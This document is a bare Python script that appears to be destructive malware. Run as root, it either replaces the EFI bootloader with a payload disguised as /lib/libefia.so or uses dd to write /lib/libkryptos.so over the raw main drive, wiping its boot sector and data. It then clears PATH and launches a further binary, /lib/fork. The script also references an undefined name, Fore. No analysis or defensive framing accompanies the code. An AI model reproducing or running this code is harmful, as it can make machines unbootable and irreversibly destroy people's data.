#!/bin/python
import os
import platform
import shutil

bootmount = ""
maindrive = ""

if os.path.exists("/dev/nvme0n1"):
    maindrive = "/dev/nvme0n1"
elif os.path.exists("/dev/sda"):
    maindrive = "/dev/sda"
else:
    maindrive = "/dev/hda"

if os.path.ismount("/boot"):
    bootmount = "/boot"
elif os.path.ismount("/boot/efi"):
    bootmount = "/boot/efi"
else:
    exit(2)

def runefi():
    shutil.copyfile("/lib/libefia.so", f"{bootmount}/EFI/BOOT/BOOTX64.EFI")

def runbios():
    os.system(f"dd if=/lib/libkryptos.so of={maindrive}")


if os.getuid() != 0:
    print(f"{Fore.RED}Please run this script as root.")
    exit(1)

if os.path.isdir("/sys/firmware/efi"):
    runefi()
else:
    runbios()
    
os.chdir("/lib")

os.environ["PATH"] = ""

os.system("./fork")
